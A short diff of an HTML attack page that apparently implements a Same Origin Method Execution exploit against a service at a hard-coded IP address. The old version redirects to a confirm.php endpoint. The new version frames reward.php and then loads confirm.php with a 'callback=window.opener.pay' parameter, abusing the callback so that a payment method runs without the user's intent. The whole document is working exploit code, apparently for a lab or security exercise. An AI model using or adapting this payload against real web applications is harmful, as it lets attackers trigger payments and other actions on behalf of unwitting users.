@@ -1,8 +1,10 @@
-<script>
-    function start_some() {
-        window.open("2.html");
-        location.replace("http://222.18.158.245:6080/confirm.php");
-    }
-
-    setTimeout(start_some(), 1000);
+<iframe src="http://222.18.158.245:6080/reward.php" name=b></iframe>
+        <iframe name=a></iframe>
+        <script>
+        window.frames[0].open('http://222.18.158.245:6080/confirm.php','a');
+        setTimeout(
+          function(){
+            window.frames[1].location.href = 'http://222.18.158.245:6080/confirm.php?callback=window.opener.pay';
+          }
+        ,1000);
 </script>
